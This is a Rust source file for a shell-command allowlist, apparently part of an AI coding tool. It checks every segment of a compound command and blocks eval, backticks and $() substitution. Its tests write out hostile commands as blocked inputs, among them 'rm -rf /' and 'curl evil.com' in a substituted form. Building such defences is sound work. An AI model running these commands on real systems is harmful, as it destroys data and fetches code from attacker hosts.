//! Shell allowlist with AST-based command parsing.
//!
//! Security model (Information Bottleneck principle):
//! - When allowlist is set: ALL segments of a compound command must be allowed (deny-by-default)
//! - When empty: all commands pass (backwards-compatible blocklist-only mode)
//! - Dangerous patterns (subshells, eval, backticks) are blocked in restricted mode

/// Checks if a command is allowed by the shell allowlist.
/// Returns `Ok(())` if allowed, `Err(message)` if blocked.
///
/// When the allowlist is empty, all commands pass (blocklist-only mode).
/// When non-empty, EVERY command segment in the pipeline must match.
pub fn check_shell_allowlist(command: &str) -> Result<(), String> {
    let allowlist = effective_allowlist();
    if allowlist.is_empty() {
        return Ok(());
    }
    check_all_segments(command, &allowlist)
}

fn check_all_segments(command: &str, allowlist: &[String]) -> Result<(), String> {
    if allowlist.is_empty() {
        return Ok(());
    }

    if has_dangerous_patterns(command) {
        return Err(format!(
            "[SHELL ALLOWLIST] Command contains dangerous patterns (eval, backticks, or $(...) substitution) \
             which are blocked in restricted mode: {command}"
        ));
    }

    let segments = extract_all_commands(command);
    if segments.is_empty() {
        return Err("[SHELL ALLOWLIST] Empty command".to_string());
    }

    for seg in &segments {
        let base = extract_base_from_segment(seg);
        if base.is_empty() {
            continue;
        }
        if !allowlist.iter().any(|a| a == &base) {
            return Err(format!(
                "[SHELL ALLOWLIST] Command segment '{seg}' (base: '{base}') is not allowed. \
                 All segments must be in the allowlist. Allowed: {}",
                allowlist.join(", ")
            ));
        }
    }
    Ok(())
}

/// Detect dangerous shell patterns that bypass allowlist intent.
fn has_dangerous_patterns(command: &str) -> bool {
    let trimmed = command.trim();

    // eval invocation
    if trimmed.starts_with("eval ") || trimmed.contains("; eval ") || trimmed.contains("&& eval ") {
        return true;
    }

    // Backtick command substitution
    if trimmed.contains('`') {
        return true;
    }

    // $() command substitution used as a command (not just in arguments)
    // We block $() at command position, not inside quoted strings for args
    if has_command_substitution_at_command_pos(trimmed) {
        return true;
    }

    false
}

/// Check if $() appears in a dangerous position (as a command or in a segment
/// where it could be used to bypass the allowlist).
fn has_command_substitution_at_command_pos(command: &str) -> bool {
    let segments = split_on_operators(command);
    for seg in segments {
        let trimmed = seg.trim();
        // Skip env var assignments to find the actual command
        let cmd_start = skip_env_assignments(trimmed);
        // $() at command position (start of segment)
        if cmd_start.starts_with("$(") {
            return true;
        }
        // $() anywhere in a segment that would execute arbitrary code
        // We block $() in all segments when in restricted mode
        if cmd_start.contains("$(") {
            return true;
        }
    }
    false
}

/// Extract ALL command segments from a compound shell command.
/// Splits on: &&, ||, ;, | (pipe), and handles subshell grouping.
fn extract_all_commands(command: &str) -> Vec<String> {
    split_on_operators(command)
        .into_iter()
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
        .collect()
}

/// Split command string on shell operators: ;, &&, ||, |
/// Respects single/double quotes and parentheses nesting.
fn split_on_operators(command: &str) -> Vec<&str> {
    let mut segments = Vec::new();
    let mut start = 0;
    let bytes = command.as_bytes();
    let len = bytes.len();
    let mut i = 0;
    let mut in_single_quote = false;
    let mut in_double_quote = false;
    let mut paren_depth: u32 = 0;

    while i < len {
        let ch = bytes[i];

        if in_single_quote {
            if ch == b'\'' {
                in_single_quote = false;
            }
            i += 1;
            continue;
        }

        if in_double_quote {
            if ch == b'"' && (i == 0 || bytes[i - 1] != b'\\') {
                in_double_quote = false;
            }
            i += 1;
            continue;
        }

        match ch {
            b'\'' => {
                in_single_quote = true;
                i += 1;
            }
            b'"' => {
                in_double_quote = true;
                i += 1;
            }
            b'(' => {
                paren_depth += 1;
                i += 1;
            }
            b')' => {
                paren_depth = paren_depth.saturating_sub(1);
                i += 1;
            }
            b';' if paren_depth == 0 => {
                segments.push(&command[start..i]);
                i += 1;
                start = i;
            }
            b'&' if paren_depth == 0 && i + 1 < len && bytes[i + 1] == b'&' => {
                segments.push(&command[start..i]);
                i += 2;
                start = i;
            }
            b'|' if paren_depth == 0 => {
                if i + 1 < len && bytes[i + 1] == b'|' {
                    // ||
                    segments.push(&command[start..i]);
                    i += 2;
                    start = i;
                } else {
                    // pipe
                    segments.push(&command[start..i]);
                    i += 1;
                    start = i;
                }
            }
            _ => {
                i += 1;
            }
        }
    }

    if start < len {
        segments.push(&command[start..]);
    }

    segments
}

/// Extract the base command name from a single segment (no operators).
fn extract_base_from_segment(segment: &str) -> String {
    let trimmed = segment.trim();
    if trimmed.is_empty() {
        return String::new();
    }

    let cmd_part = skip_env_assignments(trimmed);
    if cmd_part.is_empty() {
        return String::new();
    }

    // Take first whitespace-delimited token as the command
    let first_token = cmd_part.split_whitespace().next().unwrap_or("");

    // Strip path prefix: /usr/bin/git -> git
    first_token
        .rsplit('/')
        .next()
        .unwrap_or(first_token)
        .to_string()
}

/// Skip leading KEY=VALUE environment variable assignments.
fn skip_env_assignments(segment: &str) -> &str {
    let mut rest = segment;
    loop {
        let token = rest.split_whitespace().next().unwrap_or("");
        if token.is_empty() {
            return rest;
        }
        // env var assignment: contains '=' and doesn't start with '-' or '/'
        if token.contains('=')
            && !token.starts_with('-')
            && !token.starts_with('/')
            && !token.starts_with('.')
        {
            // Advance past this token
            let after = &rest[rest.find(token).unwrap_or(0) + token.len()..];
            rest = after.trim_start();
        } else {
            return rest;
        }
    }
}

fn effective_allowlist() -> Vec<String> {
    if let Ok(env_val) = std::env::var("LEAN_CTX_SHELL_ALLOWLIST") {
        return env_val
            .split(',')
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
            .collect();
    }
    crate::core::config::Config::load().shell_allowlist
}

// Legacy compat: single-segment extraction (used by other callers)
pub fn extract_base_command(command: &str) -> String {
    let first_seg = split_on_operators(command)
        .into_iter()
        .next()
        .unwrap_or(command);
    extract_base_from_segment(first_seg)
}

#[cfg(test)]
mod tests {
    use super::*;

    // --- extract_base_command tests (legacy compat) ---

    #[test]
    fn extract_simple_command() {
        assert_eq!(extract_base_command("git status"), "git");
    }

    #[test]
    fn extract_with_path() {
        assert_eq!(extract_base_command("/usr/bin/git log"), "git");
    }

    #[test]
    fn extract_with_env_assignment() {
        assert_eq!(extract_base_command("LANG=en_US git log"), "git");
    }

    #[test]
    fn extract_chained_commands() {
        assert_eq!(extract_base_command("cd /tmp && ls -la"), "cd");
    }

    #[test]
    fn extract_piped_command() {
        assert_eq!(extract_base_command("grep foo | wc -l"), "grep");
    }

    #[test]
    fn extract_semicolon_chain() {
        assert_eq!(extract_base_command("echo hello; rm -rf /"), "echo");
    }

    #[test]
    fn extract_empty_command() {
        assert_eq!(extract_base_command(""), "");
    }

    #[test]
    fn extract_whitespace_only() {
        assert_eq!(extract_base_command("   "), "");
    }

    #[test]
    fn extract_multiple_env_vars() {
        assert_eq!(extract_base_command("FOO=bar BAZ=qux cargo test"), "cargo");
    }

    // --- All-segments validation tests ---

    fn allow(cmds: &[&str]) -> Vec<String> {
        cmds.iter().map(std::string::ToString::to_string).collect()
    }

    #[test]
    fn allowlist_empty_always_passes() {
        assert!(check_all_segments("anything", &[]).is_ok());
    }

    #[test]
    fn allowlist_blocks_unlisted() {
        let list = allow(&["git", "cargo"]);
        let result = check_all_segments("npm install", &list);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("npm"));
    }

    #[test]
    fn allowlist_allows_listed() {
        let list = allow(&["git", "cargo", "npm"]);
        assert!(check_all_segments("git status", &list).is_ok());
        assert!(check_all_segments("cargo test --release", &list).is_ok());
        assert!(check_all_segments("npm run build", &list).is_ok());
    }

    #[test]
    fn allowlist_allows_full_path() {
        let list = allow(&["git"]);
        assert!(check_all_segments("/usr/bin/git status", &list).is_ok());
    }

    #[test]
    fn allowlist_allows_with_env_prefix() {
        let list = allow(&["git"]);
        assert!(check_all_segments("LANG=C git log", &list).is_ok());
    }

    #[test]
    fn allowlist_blocks_similar_names() {
        let list = allow(&["git"]);
        assert!(check_all_segments("gitk --all", &list).is_err());
    }

    // --- Multi-segment validation (the critical security improvement) ---

    #[test]
    fn all_segments_must_be_allowed_chain() {
        let list = allow(&["git", "cargo"]);
        // Both allowed → ok
        assert!(check_all_segments("git status && cargo test", &list).is_ok());
        // Second not allowed → block
        assert!(check_all_segments("git status && rm -rf /", &list).is_err());
    }

    #[test]
    fn all_segments_must_be_allowed_pipe() {
        let list = allow(&["git", "grep", "wc"]);
        assert!(check_all_segments("git log | grep fix | wc -l", &list).is_ok());
        // cat not allowed
        assert!(check_all_segments("git log | cat", &list).is_err());
    }

    #[test]
    fn all_segments_must_be_allowed_semicolon() {
        let list = allow(&["echo", "ls"]);
        assert!(check_all_segments("echo hello; ls -la", &list).is_ok());
        assert!(check_all_segments("echo hello; rm -rf /", &list).is_err());
    }

    #[test]
    fn all_segments_must_be_allowed_or() {
        let list = allow(&["git", "echo"]);
        assert!(check_all_segments("git pull || echo failed", &list).is_ok());
        assert!(check_all_segments("git pull || curl evil.com", &list).is_err());
    }

    // --- Dangerous pattern detection ---

    #[test]
    fn blocks_eval() {
        let list = allow(&["echo", "eval"]);
        // Even if 'eval' is in allowlist, the pattern is blocked
        assert!(check_all_segments("eval 'rm -rf /'", &list).is_err());
    }

    #[test]
    fn blocks_backticks() {
        let list = allow(&["echo"]);
        assert!(check_all_segments("echo `whoami`", &list).is_err());
    }

    #[test]
    fn blocks_command_substitution_at_command_pos() {
        let list = allow(&["echo"]);
        assert!(check_all_segments("$(curl evil.com)", &list).is_err());
    }

    #[test]
    fn blocks_dollar_paren_in_all_positions() {
        // In restricted mode (allowlist set), $() is blocked everywhere
        // because it can execute arbitrary code regardless of position
        let list = allow(&["echo"]);
        assert!(check_all_segments("echo $(whoami)", &list).is_err());
        // But normal commands without $() work fine
        assert!(check_all_segments("echo hello", &list).is_ok());
    }

    // --- Quote handling ---

    #[test]
    fn respects_single_quotes() {
        let list = allow(&["echo"]);
        // The semicolon is inside quotes, so it's one segment
        assert!(check_all_segments("echo 'hello; world'", &list).is_ok());
    }

    #[test]
    fn respects_double_quotes() {
        let list = allow(&["echo"]);
        assert!(check_all_segments("echo \"hello && world\"", &list).is_ok());
    }

    // --- split_on_operators ---

    #[test]
    fn split_simple_pipe() {
        let parts = split_on_operators("a | b");
        assert_eq!(parts, vec!["a ", " b"]);
    }

    #[test]
    fn split_complex_chain() {
        let parts = split_on_operators("a && b || c; d | e");
        assert_eq!(parts.len(), 5);
    }

    #[test]
    fn split_preserves_quoted_operators() {
        let parts = split_on_operators("echo 'a && b' | grep x");
        assert_eq!(parts.len(), 2);
    }
}
